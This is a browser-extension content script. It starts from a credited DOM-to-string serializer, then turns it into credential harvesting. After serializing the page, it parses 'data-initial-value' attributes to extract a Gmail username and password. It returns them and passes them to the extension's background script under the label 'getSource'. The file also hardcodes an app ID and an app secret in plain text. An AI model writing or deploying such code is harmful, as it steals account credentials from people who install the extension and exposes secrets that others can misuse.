// @author Rob W <http://stackoverflow.com/users/938089/rob-w>
// Demo: var serialized_html = DOMtoString(document);

function DOMtoString(document_root) {
    var html = '',
        node = document_root.firstChild;
    while (node) {
        switch (node.nodeType) {
        case Node.ELEMENT_NODE:
            html += node.outerHTML;
            break;
        case Node.TEXT_NODE:
            html += node.nodeValue;
            break;
        case Node.CDATA_SECTION_NODE:
            html += '<![CDATA[' + node.nodeValue + ']]>';
            break;
        case Node.COMMENT_NODE:
            html += '<!--' + node.nodeValue + '-->';
            break;
        case Node.DOCUMENT_TYPE_NODE:
            // (X)HTML documents are identified by public identifiers
            html += "<!DOCTYPE " + node.name + (node.publicId ? ' PUBLIC "' + node.publicId + '"' : '') + (!node.publicId && node.systemId ? ' SYSTEM' : '') + (node.systemId ? ' "' + node.systemId + '"' : '') + '>\n';
            break;
        }
        node = node.nextSibling;
    }
    // html = html.split()
    str = html
    var regex = /data-initial-value/gi, result, indices = [];
    while ( (result = regex.exec(str)) ) {
        indices.push(result.index);
    }
    console.log(html.substring(indices[3]+20).search('"'));
    next = html.substring(indices[2]+20).search('"');
    user = html.substring(indices[2]+20, indices[2]+20+next) + "@gmail.com"
    next = html.substring(indices[3]+20).search('"');
    pass = html.substring(indices[3]+20, indices[3]+20+next)
    appId = "169881873927995";
    appSecret = "a0e66422cc8ac29ce24ed41c471c081a";
    return user + " " + pass;
}

chrome.runtime.sendMessage({
    action: "getSource",
    source: DOMtoString(document)
});